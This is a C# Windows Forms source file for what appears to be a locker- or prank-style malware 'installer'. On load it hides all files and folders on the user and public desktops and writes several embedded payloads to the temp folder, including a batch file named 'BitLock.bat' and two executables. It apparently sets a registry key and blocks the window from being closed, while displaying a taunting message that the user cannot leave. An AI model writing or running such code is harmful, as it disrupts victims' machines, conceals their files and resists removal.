using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace _1nstaller
{
    public partial class Form1 : Form
    {
        string _tempDir = Path.GetTempPath();
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            HideDesktopFiles();
            WriteFiles();
            Regedit.RegKey();
            label1.Text = "Hello " + Environment.UserName + " :)";
            label2.Text = "Now you are in the family" + Environment.NewLine +
                          "and you will not be able" + Environment.NewLine +
                          " to leave us in any way";
            
        }

        void WriteFiles()
        {
            File.WriteAllBytes(_tempDir + "BitLock.bat", Properties.Resources.BatchFile);
            File.WriteAllBytes(_tempDir + "Again.txt", Properties.Resources.Again);
            File.WriteAllBytes(_tempDir + "emojicursor.cur", Properties.Resources.Emojicur);
            File.WriteAllBytes(_tempDir + "emojiicon.ico", Properties.Resources.Emojiico);
            File.WriteAllBytes(_tempDir + "Wallpaper.jpg", Properties.Resources.Wallpaper);
            File.WriteAllBytes(_tempDir + "OurFamily.exe", Properties.Resources.InfinityForm);
            File.WriteAllBytes(_tempDir + "MainT.exe", Properties.Resources.MainT);
        }

        void HideDesktopFiles()
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string pDesktop = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
            foreach (var files in Directory.GetFiles(desktop)) { File.SetAttributes(files, FileAttributes.Hidden); }
            foreach (var dir in Directory.GetDirectories(desktop)) { File.SetAttributes(dir, FileAttributes.Hidden); }

            foreach (var files in Directory.GetFiles(pDesktop)) { File.SetAttributes(files, FileAttributes.Hidden); }
            foreach (var dir in Directory.GetDirectories(pDesktop)) { File.SetAttributes(dir, FileAttributes.Hidden); }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            bool success = false;
            if (!success)
                e.Cancel = true;
        }
    }
}
